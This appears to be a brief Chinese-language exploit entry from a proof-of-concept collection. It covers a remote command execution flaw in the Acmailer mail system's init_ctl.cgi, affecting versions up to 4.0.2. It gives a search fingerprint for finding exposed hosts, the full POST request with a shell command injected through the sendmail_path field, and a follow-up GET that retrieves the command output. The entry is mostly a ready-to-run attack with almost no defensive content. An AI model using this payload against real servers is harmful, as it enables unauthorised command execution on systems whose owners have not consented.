# Acmailer邮件系统init_ctl存在远程命令执行漏洞

- **系统**：Acmailer　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="CGI acmailer"`
- **请求**：`POST /init_ctl.cgi HTTP/1.1`
- **关键头**：`Content-Length: 150`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=id > 13619.txt  bash&homeurl=http://&mypath=e

获取命令执行结果
GET /13619.txt HTTP/1.1
Host:
Cookie: sid=a6d9c99e3ae98d10ee34acc24af3f536
```

**其他**
- Acmailer邮件系统init\_ctl存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Version≤Acmailer 4.0.2